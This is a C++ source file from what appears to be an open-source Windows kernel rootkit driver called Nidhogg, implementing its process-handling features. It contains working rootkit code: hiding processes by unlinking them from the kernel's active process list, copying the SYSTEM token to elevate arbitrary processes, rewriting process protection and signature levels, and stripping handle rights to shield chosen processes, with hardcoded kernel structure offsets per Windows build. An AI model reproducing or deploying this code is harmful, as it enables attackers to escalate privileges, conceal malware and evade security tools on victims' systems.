#include "pch.h"
#include "ProcessHandler.h"

_IRQL_requires_max_(APC_LEVEL)
ProcessHandler::ProcessHandler() {
	if (!InitializeList(&protectedProcesses))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	if (!InitializeList(&hiddenProcesses)) {
		FreeVirtualMemory(this->protectedProcesses.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}
}

ProcessHandler::~ProcessHandler() {
	IrqlGuard guard;
	guard.SetExitIrql(PASSIVE_LEVEL);
	ClearProcessList(ProcessType::All);
	FreeVirtualMemory(this->protectedProcesses.Items);
	FreeVirtualMemory(this->hiddenProcesses.Items);
}

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(_Inout_ PVOID registrationContext, _Inout_ POB_PRE_OPERATION_INFORMATION info) {
	UNREFERENCED_PARAMETER(registrationContext);

	if (info->KernelHandle || !info->Object)
		return OB_PREOP_SUCCESS;

	PEPROCESS process = static_cast<PEPROCESS>(info->Object);
	ULONG pid = HandleToULong(PsGetProcessId(process));

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (NidhoggProcessHandler->FindProcess(pid, ProcessType::Protected)) {
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* OnProcessCreationExit is responsible for restoring hidden modules when a process exits.
* 
* Parameters:
* @parentId  [_In_ HANDLE]	 -- Parent PID, unused.
* @processId [_In_ HANDLE]	 -- PID of the process that was created or exited.
* @create	 [_In_ BOOLEAN]  -- TRUE if the process was created, FALSE if it exited.
* 
* Returns:
* There is no return value.
*/
void OnProcessCreationExit(_In_ HANDLE parentId, _In_ HANDLE processId, _In_ BOOLEAN create) {
	UNREFERENCED_PARAMETER(parentId);
	ULONG pid = HandleToUlong(processId);

	if (create || pid <= SYSTEM_PROCESS_PID)
		return;
	NidhoggMemoryHandler->RestoreModules(pid);
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [_In_ ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS]	 -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
	PEPROCESS targetProcess;
	HiddenProcessEntry entry = { 0 };
	NTSTATUS status = STATUS_SUCCESS;
	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;

	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
		return STATUS_UNSUCCESSFUL;

	if (FindProcess(pid, ProcessType::Hidden))
		return STATUS_SUCCESS;

	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetProcess) + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	// Saving the hidden process' list entry for the future to release it.
	entry.OriginalEntry = processListEntry;
	entry.Pid = pid;

	if (!AddHiddenProcess(entry)) {
		ExReleasePushLockExclusive(listLock);
		ObDereferenceObject(targetProcess);
		return STATUS_UNSUCCESSFUL;
	}

	__try {
		RemoveEntryList(processListEntry);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = GetExceptionCode();
		RemoveListEntry(&hiddenProcesses, &entry);
	}
	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* UnhideProcess is responsible for unhiding a hidden process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to unhide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	HiddenProcessEntry* entryToRestore = nullptr;
	auto finder = [](const HiddenProcessEntry* item, ULONG searchable) {
		return item->Pid == searchable;
	};

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;
	entryToRestore = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(this->hiddenProcesses, pid, finder);

	if (!entryToRestore)
		return STATUS_NOT_FOUND;

	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetProcess) + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	InsertHeadList(processListEntry, entryToRestore->OriginalEntry);

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	
	status = RemoveListEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, entryToRestore) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

	return status;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::ElevateProcess(_In_ ULONG pid) {
	PEPROCESS privilegedProcess;
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status) || tokenOffset == 0)
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(targetProcess);
		return status;
	}
	UINT64* targetToken = reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(targetProcess) + tokenOffset);
	UINT64* privilegedToken = reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(privilegedProcess) + tokenOffset);
	*targetToken = *privilegedToken;

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* SetProcessSignature is responsible for removing or adding process protection to a certain process.
*
* Parameters:
* @processSignature [IoctlProcessSignature*] -- Contains the process PID, signer type and signature signer.
*
* Returns:
* @status  			[NTSTATUS] 				 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::SetProcessSignature(_In_ IoctlProcessSignature* processSignature) {
	PEPROCESS process;
	NTSTATUS status = STATUS_SUCCESS;

	if (!IsValidPid(processSignature->Pid))
		return STATUS_INVALID_PARAMETER;

	status = PsLookupProcessByProcessId(ULongToHandle(processSignature->Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UCHAR newSignatureLevel = (processSignature->SignerType << 4) | processSignature->SignatureSigner;
	ULONG signatureLevelOffset = GetSignatureLevelOffset();

	if (signatureLevelOffset == 0) {
		ObDereferenceObject(process);
		return STATUS_UNSUCCESSFUL;
	}
	PPROCESS_SIGNATURE targetProcessSignature = reinterpret_cast<PPROCESS_SIGNATURE>(reinterpret_cast<UINT64>(process) + signatureLevelOffset);

	targetProcessSignature->SignatureLevel = newSignatureLevel;
	targetProcessSignature->Protection.Type = processSignature->SignerType;
	targetProcessSignature->Protection.Signer = processSignature->SignatureSigner;

	ObDereferenceObject(process);
	return status;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [_In_ ULONG]		 -- PID to search.
* @type   [_In_ ProcessType] -- Type of process to search (Protected or Hidden).
*
* Returns:
* @bool						 -- Whether found or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
bool ProcessHandler::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
	if (!IsValidPid(pid))
		return false;

	switch (type) {
		case ProcessType::Protected: {
			auto finder = [](_In_ const ProtectedProcessEntry* entry, _In_ ULONG pid) -> bool {
				return entry->Pid == pid;
			};

			return FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(
				this->protectedProcesses, pid, finder
			);
			break;
		}
		case ProcessType::Hidden: {
			auto finder = [](_In_ const HiddenProcessEntry* entry, _In_ ULONG pid) -> bool {
				return entry->Pid == pid;
			};

			return FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(
				this->hiddenProcesses, pid, finder
			);
			break;
		}
		default:
			return false;
	}
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid [_In_ ULONG] -- PID to add.
*
* Returns:
* @bool				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ProtectProcess(_In_ ULONG pid) {
	if (!IsValidPid(pid))
		return false;

	if (FindProcess(pid, ProcessType::Protected))
		return true;
	ProtectedProcessEntry* newEntry = AllocateMemory<ProtectedProcessEntry*>(sizeof(ProtectedProcessEntry));

	if (!newEntry)
		return false;
	newEntry->Pid = pid;
	AddEntry<ProcessList, ProtectedProcessEntry>(&protectedProcesses, newEntry);

	return true;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid [_In_ ULONG] -- PID to add.
*
* Returns:
* @bool				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
	if (!IsValidPid(hiddenProcess.Pid) || !hiddenProcess.OriginalEntry)
		return false;

	if (FindProcess(hiddenProcess.Pid, ProcessType::Hidden))
		return false;
	HiddenProcessEntry* newEntry = AllocateMemory<HiddenProcessEntry*>(sizeof(HiddenProcessEntry));

	if (!newEntry)
		return false;
	newEntry->Pid = hiddenProcess.Pid;
	newEntry->OriginalEntry = hiddenProcess.OriginalEntry;
	AddEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, newEntry);
	return true;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [_In_ ULONG]		 -- PID to remove.
* @type   [_In_ ProcessType] -- Type of process to remove (Protected or Hidden).
*
* Returns:
* @bool						 -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
	if (!IsValidPid(pid))
		return false;

	switch (type) {
	case ProcessType::Protected: {
		auto finder = [](_In_ const ProtectedProcessEntry* item, _In_ ULONG pid) {
			return item->Pid == pid;
		};
		ProtectedProcessEntry* entry = FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(protectedProcesses, pid, finder);

		if (!entry)
			return false;
		return RemoveListEntry<ProcessList, ProtectedProcessEntry>(&protectedProcesses, entry);
	}
	
	case ProcessType::Hidden: {
		auto finder = [](_In_ const HiddenProcessEntry* item, _In_ ULONG pid) {
			return item->Pid == pid;
			};
		HiddenProcessEntry* entry = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(hiddenProcesses, pid, finder);

		if (!entry)
			return false;
		return RemoveListEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearProcessList is responsible for clearing the list of protected or hidden processes.
*
* Parameters:
* @type   [_In_ ProcessType] -- Type of process to remove (Protected or Hidden).
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void ProcessHandler::ClearProcessList(_In_ ProcessType type) {
	switch (type) {
	case ProcessType::Protected:
		ClearList<ProcessList, ProtectedProcessEntry>(&this->protectedProcesses);
		break;
	case ProcessType::Hidden:
		ClearList<ProcessList, HiddenProcessEntry>(&this->hiddenProcesses);
		break;
	case ProcessType::All:
		ClearList<ProcessList, ProtectedProcessEntry>(&this->protectedProcesses);
		ClearList<ProcessList, HiddenProcessEntry>(&this->hiddenProcesses);
		break;
	}
}

/*
* Description:
* ListProtectedProcesses is responsible for listing all protected processes and writing their PIDs to the provided output structure.
* 
* Parameters:
* @processList [_Inout_ IoctlProcessList*] -- Output structure to write the PIDs of protected processes.
* 
* Returns:
* @bool										-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;

	if (!processList)
		return false;

	AutoLock locker(protectedProcesses.Lock);

	if (protectedProcesses.Count == 0) {
		processList->Count = 0;
		return true;
	}
	if (processList->Count != protectedProcesses.Count)  {
		processList->Count = protectedProcesses.Count;
		return true;
	}
	MemoryGuard guard(processList->Processes, static_cast<ULONG>(sizeof(ULONG) * protectedProcesses.Count), UserMode);

	if (!guard.IsValid())
		return false;
	currentEntry = protectedProcesses.Items;

	while (currentEntry->Flink != protectedProcesses.Items && count < protectedProcesses.Count) {
		currentEntry = currentEntry->Flink;
		ProtectedProcessEntry* item = CONTAINING_RECORD(currentEntry, ProtectedProcessEntry, Entry);

		if (item)
			processList->Processes[count] = item->Pid;
		count++;
		currentEntry = currentEntry->Flink;
	}

	processList->Count = count;
	return true;
}

/*
* Description:
* ListProtectedProcesses is responsible for listing all protected processes and writing their PIDs to the provided output structure.
*
* Parameters:
* @processList [_Inout_ IoctlProcessList*] -- Output structure to write the PIDs of protected processes.
*
* Returns:
* @bool										-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;

	if (!processList)
		return false;

	AutoLock locker(hiddenProcesses.Lock);

	if (hiddenProcesses.Count == 0) {
		processList->Count = 0;
		return true;
	}
	if (processList->Count != hiddenProcesses.Count) {
		processList->Count = hiddenProcesses.Count;
		return true;
	}
	MemoryGuard guard(processList->Processes, static_cast<ULONG>(sizeof(ULONG) * hiddenProcesses.Count), UserMode);

	if (!guard.IsValid())
		return false;
	currentEntry = hiddenProcesses.Items;

	while (currentEntry->Flink != hiddenProcesses.Items && count < hiddenProcesses.Count) {
		currentEntry = currentEntry->Flink;
		HiddenProcessEntry* item = CONTAINING_RECORD(currentEntry, HiddenProcessEntry, Entry);

		if (item)
			processList->Processes[count] = item->Pid;
		count++;
		currentEntry = currentEntry->Flink;
	}

	processList->Count = count;
	return true;
}

/*
* Description:
* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
* (field Token in _EPROCESS structure)
* Parameters:
* There are no parameters.
*
* Returns:
* @tokenOffset [ULONG] -- Offset of the main thread's token or 0.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG ProcessHandler::GetTokenOffset() const {
	ULONG tokenOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return tokenOffset;

	switch (WindowsBuildNumber) {
	case WIN_1507:
	case WIN_1511:
	case WIN_1607:
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		tokenOffset = 0x358;
		break;
	case WIN_1903:
	case WIN_1909:
		tokenOffset = 0x360;
		break;
	case WIN_11_24H2:
		tokenOffset = 0x248;
		break;
	default:
		tokenOffset = 0x4b8;
		break;
	}

	return tokenOffset;
}

/*
* Description:
* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
* (field ActiveProcessLinks in _EPROCESS structure)
*
* Parameters:
* There are no parameters.
*
* Returns:
* @activeProcessLinks [ULONG] -- Offset of active process links.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG ProcessHandler::GetActiveProcessLinksOffset() const {
	ULONG activeProcessLinks = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return activeProcessLinks;

	switch (WindowsBuildNumber) {
	case WIN_1507:
	case WIN_1511:
	case WIN_1607:
	case WIN_1903:
	case WIN_1909:
		activeProcessLinks = 0x2f0;
		break;
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		activeProcessLinks = 0x2e8;
		break;
	case WIN_11_24H2:
		activeProcessLinks = 0x1d8;
		break;
	default:
		activeProcessLinks = 0x448;
		break;
	}

	return activeProcessLinks;
}

/*
* Description:
* GetSignatureLevelOffset is responsible for getting the signature level offset depends on the windows version.
* (field SignatureLevel in _EPROCESS structure)
*
* Parameters:
* There are no parameters.
*
* Returns:
* @signatureLevelOffset [UINT64] -- Offset of the process' signature level.
*/
ULONG ProcessHandler::GetSignatureLevelOffset() const {
	ULONG signatureLevelOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return signatureLevelOffset;

	switch (WindowsBuildNumber) {
	case WIN_1903:
	case WIN_1909:
		signatureLevelOffset = 0x6f8;
		break;
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		signatureLevelOffset = 0x6c8;
		break;
	case WIN_1607:
		signatureLevelOffset = 0x6c0;
		break;
	case WIN_1511:
		signatureLevelOffset = 0x6b0;
		break;
	case WIN_1507:
		signatureLevelOffset = 0x6a8;
		break;
	case WIN_11_24H2:
		signatureLevelOffset = 0x5f8;
		break;
	default:
		signatureLevelOffset = 0x878;
		break;
	}

	return signatureLevelOffset;
}